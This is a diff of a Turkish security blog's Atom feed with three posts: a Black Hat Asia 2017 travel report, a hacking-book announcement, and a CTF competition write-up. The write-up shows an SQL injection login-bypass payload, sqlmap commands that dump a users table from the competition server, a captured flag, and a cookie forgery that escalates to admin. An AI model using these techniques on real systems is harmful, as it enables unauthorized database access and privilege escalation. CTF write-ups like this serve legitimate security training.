@@ -1,9 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>Mustafa ALTINKAYNAK - Genel</title><link href="/" rel="alternate"></link><link href="/feeds/genel.atom.xml" rel="self"></link><id>/</id><updated>2017-04-04T23:40:00+03:00</updated><entry><title>Black Hat ASIA 2017 ve Singapur Macerası</title><link href="/blackhat-asia-2017-ve-singapur-macerasi.html" rel="alternate"></link><published>2017-04-04T23:40:00+03:00</published><updated>2017-04-04T23:40:00+03:00</updated><author><name>admin</name></author><id>tag:None,2017-04-04:/blackhat-asia-2017-ve-singapur-macerasi.html</id><summary type="html">&lt;p&gt;1997 yılından bu yana aralıksız sürdürülen, uluslararası boyutta siber güvenlik uzmanlarının, hackerların ve istihbarat 
-elemanlarının katılım gösterdiği Black Hat konferansına Mart ayı sonunda katılma fırsatını yakaladım.&lt;/p&gt;
-&lt;p&gt;Singapur'a gitmeden günler öncesinde ilgili planlarımı yapmıştım. 
-Dışişleri Bakanlığımız tarafından &lt;a href="http://www.mfa.gov.tr/singapur-seyahat-edecek-turk-vatandaslarinin-dikkatine.tr.mfa"&gt;bu&lt;/a&gt;
-bağlantıda yaptığı açıklama üzerine pasaportumun bitiş süresini 1 sene daha uzattım. Gidiş-Dönüş uçak …&lt;/p&gt;</summary><content type="html">&lt;p&gt;1997 yılından bu yana aralıksız sürdürülen, uluslararası boyutta siber güvenlik uzmanlarının, hackerların ve istihbarat 
+<feed xmlns="http://www.w3.org/2005/Atom"><title>Mustafa ALTINKAYNAK</title><link href="/" rel="alternate"></link><link href="/feeds/genel.atom.xml" rel="self"></link><id>/</id><updated>2017-04-04T23:40:00+03:00</updated><entry><title>Black Hat ASIA 2017 ve Singapur Macerası</title><link href="/blackhat-asia-2017-ve-singapur-macerasi.html" rel="alternate"></link><updated>2017-04-04T23:40:00+03:00</updated><author><name>admin</name></author><id>tag:,2017-04-04:blackhat-asia-2017-ve-singapur-macerasi.html</id><summary type="html">&lt;p&gt;1997 yılından bu yana aralıksız sürdürülen, uluslararası boyutta siber güvenlik uzmanlarının, hackerların ve istihbarat 
 elemanlarının katılım gösterdiği Black Hat konferansına Mart ayı sonunda katılma fırsatını yakaladım.&lt;/p&gt;
 &lt;p&gt;Singapur'a gitmeden günler öncesinde ilgili planlarımı yapmıştım. 
 Dışişleri Bakanlığımız tarafından &lt;a href="http://www.mfa.gov.tr/singapur-seyahat-edecek-turk-vatandaslarinin-dikkatine.tr.mfa"&gt;bu&lt;/a&gt;
@@ -28,14 +24,14 @@ Türkiye'yi duyup duymadığını sorduğumda İstanbul ile ilgili olumlu cevapl
 &lt;p&gt;Şehrin çoğu noktasından sizlere hayranlıkla bakmanızı sağlayan bu yapıtın en üst katına çıkma şansına da sahip oldum. 56.katta Skypark, 57.katta ise sonsuzluk havuzu bulunuyordu. Sonsuzluk havuzuna yalnızca otel müşterilerinin kullanımına açıktı. Size sanki bir uçurumun kenarında yüzme hissi verecek olan bu deneyimi Singapur'a gelirseniz kesinlikle denemenizi öneririm.&lt;/p&gt;
 &lt;h2&gt;Sentosa Adası&lt;/h2&gt;
 &lt;p&gt;Sentosa bir başka deyişle söylemek gerekirse eğlence adası Singapur'un en çok turist ağırlayan noktalarından birisidir. Şehrinden herhangi bir noktasından &lt;strong&gt;HarbourFront&lt;/strong&gt; istasyonunda inmeniz durumunda Sentosa Adasına ulaşabilirsiniz. Adaya ulaşmak için dilerseniz buradaki teleferik hatlarından ya da yürüyüş bandını kullanabilirsiniz. Olabildiğince yürüyüş parkurunu kullanmanızı öneririm. &lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim1.jpeg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim1.jpeg" /&gt;&lt;/p&gt;
 &lt;p&gt;Bu adada yapılabilecek seçenekler geniş. Dilerseniz Universal Stüdyolarında temasından düzenlenmiş olan büyük, geniş lunaparklarda vakit geçirebilir ya da beyaz kumsallarda yürüyüşler yapabilirsiniz. Benim tercihim beyaz kumsallarda yürümek oldu. Bunun için rotamı &lt;strong&gt;Palawan&lt;/strong&gt; plajına çevirdim. Gerçekten çok harika bir kumsal sunan bu plaj aynı zamanda &lt;strong&gt;Asya kıtasının en güney noktası&lt;/strong&gt; olması nedeniyle de ayrı bir ilgimi çekmişti. Turkuaz rengi suyuyla, beyaz kumsalıyla beni kendisine hayran bırakmayı başardı. &lt;/p&gt;
 &lt;h2&gt;Black Hat başlıyor!&lt;/h2&gt;
 &lt;p&gt;Black Hat maillerini dikkatle takip ediyordum. Etkinlik öncesinde tarafıma gelen e-posta da kaydımı Çarşamba gününden yapmam gerektiği, Perşembe gününde kalabalık olabileceği şeklinde bilgi iletiliyordu. İlgili e-postaya uyarak Çarşamba günü erken saatlerde Marina Bay'ın etkinliğin olacağı kısmına gittim. Görkemli bir sunum hazırlığı tamamlanmış görünüyordu. Hazırlanan bilgisayarlarda kayıt sırasında girmiş olduğunuz e-posta adresiyle sorgu yaparak yaka kartınızı çıkartabiliyorsunuz. Bu aşamasının gayet güzel olduğunu ifade edebilirim. Olabildiğince insan kaynağını doğru yerlerde kullanılmasına özen gösterilmiş olduğunu fark ediyordum. &lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim2.jpeg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim2.jpeg" /&gt;&lt;/p&gt;
 &lt;p&gt;Çoğunluğunu Asyalıların oluşturduğu bir güvenlikçi kitlesi gördüğümü ifade edebilirim. Ek olarak yine hatırlatmak gerekirse Türkiye'den sanırım tek katılımcı bendim. Türkiye'den geldiğimi ifade ettiğim tüm herkeste kısa süreli bir şaşkınlık ifadesi olduğunu söyleyebilirim.&lt;/p&gt;
 &lt;p&gt;İlk konuşma Google mühendislerinden Halvar Flake tarafından yapıldı. Neden güvenli internet inşa etmiyoruz temasıyla açılış konuşması niteliğinde bir sunum gerçekleştirdi. &lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim3.jpeg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim3.jpeg" /&gt;&lt;/p&gt;
 &lt;p&gt;Konuşmanın standartların aksine işlerin nasıl düzende yürüdüğümüzü sanıp, aslında da hiç de öyle olmadığını bize gösterdi.&lt;/p&gt;
 &lt;p&gt;Eş zamanlı gerçekleştirilen brifing sunumları için ilgi alanlarınıza yönelik bir takvim hazırlamanız sizler için daha faydalı olacaktır. Arsenal stantlarında Haoqi Shan tarafından sunulan &lt;a href="https://www.blackhat.com/asia-17/arsenal.html#unicorns-rfid-armoury"&gt;Unicorn's RFID Armoury&lt;/a&gt; çok ilgimi çekti. Tüm Arsenal listesine &lt;a href="https://www.blackhat.com/asia-17/arsenal.html"&gt;buradan&lt;/a&gt;, brifinglerin listesine ise &lt;a href="https://www.blackhat.com/asia-17/briefings/schedule/index.html"&gt;buradan&lt;/a&gt; ulaşabilirsiniz.&lt;/p&gt;
 &lt;p&gt;Bir diğer dikkatle takip ettiğim sunum Net Square CEO'su Saumil Shah tarafından yapılan &lt;strong&gt;The Seven Axioms of Security&lt;/strong&gt; isimli sunumdu. Saumil her seviyeden dinleyicinin anlayacağı şekilde eğlenceli ve eleştirisel bir yaklaşım gerçekleştirdi.&lt;/p&gt;
@@ -44,12 +40,12 @@ Türkiye'yi duyup duymadığını sorduğumda İstanbul ile ilgili olumlu cevapl
 &lt;p&gt;Business Hall'da ise çok sayıda firmanın stantları yer aldı. Rapid7'den RSA'ya
  Tenable'dan NTT Security'e kadar çok sayıda firma ürünleriyle birlikte gelen katılımcıları ağırladı.&lt;/p&gt;
 &lt;p&gt;En çok ilgi gören stantlar şüphesiz &lt;strong&gt;Tenable&lt;/strong&gt; ve &lt;strong&gt;Rapid7&lt;/strong&gt; firmalarının stantlarıydı. Bu stantlara sunum aralarında ne zaman baksam her daim birileri anlatılanları meraklı bir halde dinliyorlardı.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim6.jpg"&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim7.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim6.jpg" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim7.jpg" /&gt;&lt;/p&gt;
 &lt;p&gt;NTT Security stantında katılımcılar Lock-picking deniyor. NTT Security bu işi yarış haline getirmiş olacak ki Lock-picking konusunda şampiyon belirlemeye çalışıyordu.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim4.jpeg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/blackhat/resim4.jpeg" /&gt;&lt;/p&gt;
 &lt;h2&gt;Özetle&lt;/h2&gt;
-&lt;p&gt;Kısacası dolu dolu geçen bir Black Hat etkinliği oldu. Bir başka güzel etkinlikte olmak dileğiyle.&lt;/p&gt;</content><category term="Black Hat ASIA 2017"></category></entry><entry><title>Siber Güvenlik ve Hacking Kitabı</title><link href="/siber-guvenlik-ve-hacking-kitabi.html" rel="alternate"></link><published>2017-02-10T23:40:00+02:00</published><updated>2017-02-10T23:40:00+02:00</updated><author><name>admin</name></author><id>tag:None,2017-02-10:/siber-guvenlik-ve-hacking-kitabi.html</id><summary type="html">&lt;p&gt;Yaklaşık bir seneyi aşkın süredir üzerinde çalıştığım &lt;strong&gt;"Uygulamalı Siber Güvenlik ve Hacking Kitabı"&lt;/strong&gt;
+&lt;p&gt;Kısacası dolu dolu geçen bir Black Hat etkinliği oldu. Bir başka güzel etkinlikte olmak dileğiyle.&lt;/p&gt;</summary><category term="Black Hat ASIA 2017"></category></entry><entry><title>Siber Güvenlik ve Hacking Kitabı</title><link href="/siber-guvenlik-ve-hacking-kitabi.html" rel="alternate"></link><updated>2017-02-10T23:40:00+02:00</updated><author><name>admin</name></author><id>tag:,2017-02-10:siber-guvenlik-ve-hacking-kitabi.html</id><summary type="html">&lt;p&gt;Yaklaşık bir seneyi aşkın süredir üzerinde çalıştığım &lt;strong&gt;"Uygulamalı Siber Güvenlik ve Hacking Kitabı"&lt;/strong&gt;
 Akademik Bilişim 2017'in ilk gününde Abaküs Kitap standında satışa sunuldu.&lt;/p&gt;
 &lt;h2&gt;Nerelerden satın alabilirim?&lt;/h2&gt;
 &lt;ul&gt;
@@ -70,29 +66,7 @@ Akademik Bilişim 2017'in ilk gününde Abaküs Kitap standında satışa sunuld
 &lt;li&gt;&lt;a href="https://www.eganba.com/kitap/uygulamali-siber-guvenlik-ve-hacking-mustafa-altinkaynak/9786059129688"&gt;Eganba&lt;/a&gt;&lt;/li&gt;
 &lt;li&gt;&lt;a href="http://www.pandora.com.tr/urun/uygulamali-siber-guvenlik-ve-hacking/549274"&gt;Pandora&lt;/a&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siber-guvenlik-ve-hacking-kitabi.jpg"&gt;&lt;/p&gt;
-&lt;h2&gt;Kitapta hangi konular …&lt;/h2&gt;</summary><content type="html">&lt;p&gt;Yaklaşık bir seneyi aşkın süredir üzerinde çalıştığım &lt;strong&gt;"Uygulamalı Siber Güvenlik ve Hacking Kitabı"&lt;/strong&gt;
-Akademik Bilişim 2017'in ilk gününde Abaküs Kitap standında satışa sunuldu.&lt;/p&gt;
-&lt;h2&gt;Nerelerden satın alabilirim?&lt;/h2&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;a href="http://www.dr.com.tr/Kitap/Uygulamali-Siber-Guvenlik-ve-Hacking/Egitim-Basvuru/Bilgisayar/urunno=0001691696001"&gt;D&amp;amp;R&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.idefix.com/Kitap/Uygulamali-Siber-Guvenlik-ve-Hacking/Mustafa-Altinkaynak/Egitim-Basvuru/Bilgisayar/urunno=0001691696001"&gt;Idefix&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.abakuskitap.com/uygulamali-siber-guvenlik-ve-hacking"&gt;Abaküs Kitap&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.kitapyurdu.com/kitap/uygulamali-siber-guvenlik-ve-hacking/417276.html"&gt;Kitap Yurdu&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://urun.n11.com/bilgisayar-kitaplari/uygulamali-siber-guvenlik-ve-hacking-P163720810?cid=604001"&gt;n11&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.tdk.com.tr/Uygulamali-Siber-Guvenlik-ve-Hacking_46454.html"&gt;TDK&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.kitapstore.com/urun/415268/kitap/abakus-kitap/mustafa-altinkaynak/uygulamali-siber-guvenlik-ve-hacking/"&gt;Kitap Store&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.kitapavrupa.com/kitap/uygulamali-siber-guvenlik-ve-hacking/417276.html"&gt;Kitap Avrupa&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.babil.com/uygulamali-siber-guvenlik-ve-hacking-kitabi-mustafa-altinkaynak"&gt;Babil&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://kitapsec.com/Products/Uygulamali-Siber-Guvenlik-ve-Hacking-Abakus-Yayinlari-135676.html"&gt;Kitapsec&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.arkadas.com.tr/kitap/uygulamali-siber-guvenlik-ve-hacking/9786059129688"&gt;Arkadas&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.kitapsahaf.net/uygulamali-siber-guvenlik-ve-hacking-p715844.html"&gt;KitapSahaf&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.kitapdenizi.com/uygulamali-siber-guvenlik-ve-hacking"&gt;KitapDenizi&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.nobelkitap.com/uygulamali-siber-guvenlik-ve-hacking-324654.html"&gt;NobelKitap&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="https://www.eganba.com/kitap/uygulamali-siber-guvenlik-ve-hacking-mustafa-altinkaynak/9786059129688"&gt;Eganba&lt;/a&gt;&lt;/li&gt;
-&lt;li&gt;&lt;a href="http://www.pandora.com.tr/urun/uygulamali-siber-guvenlik-ve-hacking/549274"&gt;Pandora&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siber-guvenlik-ve-hacking-kitabi.jpg"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siber-guvenlik-ve-hacking-kitabi.jpg" /&gt;&lt;/p&gt;
 &lt;h2&gt;Kitapta hangi konular yer alıyor?&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;Siber Güvenliğe Giriş&lt;/li&gt;
@@ -146,86 +120,83 @@ Akademik Bilişim 2017'in ilk gününde Abaküs Kitap standında satışa sunuld
 &lt;li&gt;Teensy&lt;/li&gt;
 &lt;li&gt;Tavsiyeler&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;ve çok daha fazlasını kitap içerisinde bulabilirsiniz.&lt;/p&gt;</content><category term="Uygulamalı Siber Güvenlik ve Hacking Kitabı"></category></entry><entry><title>BTK (USOM) Siber Yıldız Yarışması Çözümleri</title><link href="/btk-usom-siber-yildiz-yarismasi-cozumleri.html" rel="alternate"></link><published>2017-01-23T23:40:00+02:00</published><updated>2017-01-23T23:40:00+02:00</updated><author><name>admin</name></author><id>tag:None,2017-01-23:/btk-usom-siber-yildiz-yarismasi-cozumleri.html</id><summary type="html">&lt;h2&gt;Siber Yıldız Yarışması nedir?&lt;/h2&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/siber.jpeg"&gt;&lt;/p&gt;
-&lt;p&gt;Türkiye'de var olan Siber Güvenlik Uzmanlarının keşfedileceği, onları cesaretlendirip, onore edici ödüllerin de verileceği ülkemizin 2017 yılı Siber Yıldızlarının belirleneceği Siber Güvenlik Yarışmasıdır.&lt;/p&gt;
-&lt;p&gt;Yarışmayı &lt;strong&gt;KırmızıBeyaz&lt;/strong&gt; ekibi olarak başarıyla tamamladık. Takım arkadaşlarım &lt;strong&gt;Hakan ERYAVUZ&lt;/strong&gt;, &lt;strong&gt;Besim ALTINOK&lt;/strong&gt; ve &lt;strong&gt;Meryem AKDOĞAN&lt;/strong&gt;'ı kutluyorum. Resmi açıklamayı bekliyoruz. Bu sürede sizlerle …&lt;/p&gt;</summary><content type="html">&lt;h2&gt;Siber Yıldız Yarışması nedir?&lt;/h2&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/siber.jpeg"&gt;&lt;/p&gt;
+&lt;p&gt;ve çok daha fazlasını kitap içerisinde bulabilirsiniz.&lt;/p&gt;</summary><category term="Uygulamalı Siber Güvenlik ve Hacking Kitabı"></category><category term="Uygulamalı Siber Güvenlik ve Hacking Kitabı"></category></entry><entry><title>BTK (USOM) Siber Yıldız Yarışması Çözümleri</title><link href="/btk-usom-siber-yildiz-yarismasi-cozumleri.html" rel="alternate"></link><updated>2017-01-23T23:40:00+02:00</updated><author><name>admin</name></author><id>tag:,2017-01-23:btk-usom-siber-yildiz-yarismasi-cozumleri.html</id><summary type="html">&lt;h2&gt;Siber Yıldız Yarışması nedir?&lt;/h2&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/siber.jpeg" /&gt;&lt;/p&gt;
 &lt;p&gt;Türkiye'de var olan Siber Güvenlik Uzmanlarının keşfedileceği, onları cesaretlendirip, onore edici ödüllerin de verileceği ülkemizin 2017 yılı Siber Yıldızlarının belirleneceği Siber Güvenlik Yarışmasıdır.&lt;/p&gt;
 &lt;p&gt;Yarışmayı &lt;strong&gt;KırmızıBeyaz&lt;/strong&gt; ekibi olarak başarıyla tamamladık. Takım arkadaşlarım &lt;strong&gt;Hakan ERYAVUZ&lt;/strong&gt;, &lt;strong&gt;Besim ALTINOK&lt;/strong&gt; ve &lt;strong&gt;Meryem AKDOĞAN&lt;/strong&gt;'ı kutluyorum. Resmi açıklamayı bekliyoruz. Bu sürede sizlerle çözümlediğimiz soruları paylaşmak istedik. Besim Altınok'un &lt;a href="https://github.com/besimaltnok/siberyildiz"&gt;github hesabından&lt;/a&gt; diğer sorulara ulaşabilirsiniz. Sorular yazıldıkça içerik güncellenecektir.&lt;/p&gt;
 &lt;h2&gt;2. Bakalım ne kadar iyisin?&lt;/h2&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru2/1.png"&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru2/1.png" /&gt;
 Bu soru basit bir SQL injection sorusuydu. Başta temel SQL injection ile ilerledik. Kullanıcı adı kısmına sayfanın altında yer alan ibareden hareketle &lt;strong&gt;Yonetici&lt;/strong&gt;, parola kısmına ise &lt;strong&gt;'1 'or'='1&lt;/strong&gt; şeklinde yazdığımızda sayfa çıktısında "&lt;strong&gt;giriş yaptın&lt;/strong&gt;" şeklinde ibare aldık. Artık bariz SQL injection olduğu ortada idi.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru2/2.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru2/2.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Hedef uygulama üzerinde boolean ve time based olmak üzere iki farklı SQL injection zafiyeti tespit ettik. Bağlantımızın yavaş olması nedeniyle time based üzerinden sonuç alamayabilirdik. Bu yüzden boolean SQL injection tekniğiyle ilerledik. Sqlmap aracıyla yeni tanışanlar için basit şekilde anlatmak istiyorum.&lt;/p&gt;
 &lt;p&gt;Aşağıdaki komut ile birlikte &lt;strong&gt;parola&lt;/strong&gt; parametresini hedef alarak &lt;strong&gt;dbs&lt;/strong&gt; parametresi sayesinde veritabanı listesini getirdik.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;  sqlmap.py -u &amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot; --data=&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot; -p parola --risk=3  --level=5 --dbms=mysql --dbs&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;parola&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;risk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;  &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbs&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Bu komutta ise bir önceki komut ile elde ettiğimiz &lt;strong&gt;web2&lt;/strong&gt; adındaki veritabanında yer alan tüm tabloları getirdik.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;  sqlmap.py -u &amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot; --data=&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot; -p parola --risk=3 --level=5 --dbms=mysql -D web2 --tables&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;parola&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;risk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="n"&gt;web2&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;tables&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;Aşağıdaki komut ile birlikte bir önceki komutlar ile elde ettiğimiz "web2" ve "kullanıcılar" tablosunun dökümünü(&lt;strong&gt;--dump&lt;/strong&gt;) aldık.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;  sqlmap.py -u &amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot; --data=&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot; -p parola --risk=3 --level=5 --dbms=mysql --dbs --random-agent -D web2 -T kullanicilar --dump&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="n"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;py&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;u&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/index.php&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;kullaniciadi=Yonetici&amp;amp;parola=&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;p&lt;/span&gt; &lt;span class="n"&gt;parola&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;risk&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;level&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbms&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;mysql&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dbs&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;agent&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;D&lt;/span&gt; &lt;span class="n"&gt;web2&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt; &lt;span class="n"&gt;kullanicilar&lt;/span&gt; &lt;span class="o"&gt;--&lt;/span&gt;&lt;span class="n"&gt;dump&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;p&gt;İlgili flag kullanıcılar tablosunda yer almaktaydı ve flag boolean tekniğiyle karşımıza geldi.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;  FLAG: f4aa0edc033b9dfcc676c33420996789&lt;/span&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;  &lt;span class="nl"&gt;FLAG:&lt;/span&gt; &lt;span class="n"&gt;f4aa0edc033b9dfcc676c33420996789&lt;/span&gt;
 &lt;/pre&gt;&lt;/div&gt;
 
 
 &lt;h2&gt;3. Yetkili bir kullanıcı ile giriş yapman lazım.&lt;/h2&gt;
 &lt;p&gt;Bu sayfada ise bizi websitesi karşılıyor.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru3/1.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru3/1.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Sayfa içerisinde gezinirken bir yandan da headerı kontrol ediyordum. Header içerisinde isAdmin=cfcd208495d565ef66e7dff9f98764da şeklinde tanımlanmış bir cookie bilgisine ulaştık. &lt;strong&gt;cfcd208495d565ef66e7dff9f98764da&lt;/strong&gt; md5 değerini çözünce 0 olarak gördük. Yani &lt;strong&gt;isAdmin=md5(1)&lt;/strong&gt; yapmamız durumunda hak yükseltebilirdik. &lt;strong&gt;isAdmin=c4ca4238a0b923820dcc509a6f75849b&lt;/strong&gt; şeklinde isteklerimizi gönderdiğimizde bilgiler.php dosyasında flage ulaştık.&lt;/p&gt;
 &lt;h2&gt;4. Şimdi de uygulamanın kullandığı veritabanı parolası lazım.&lt;/h2&gt;
 &lt;p&gt;Bu soruya giriş yaptığımızda "404 NOT Found" hata sayfası ile karşılaşılıyordu. Sayfanın kaynağını incelediğimiz de CSS ile gizlenmiş şekilde bir form yer alıyordu.&lt;/p&gt;
-&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-2.png"&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt="" src="assets/images/siberyildiz/soru4/sanayihirsizligi-2.png" /&gt;&lt;/p&gt;
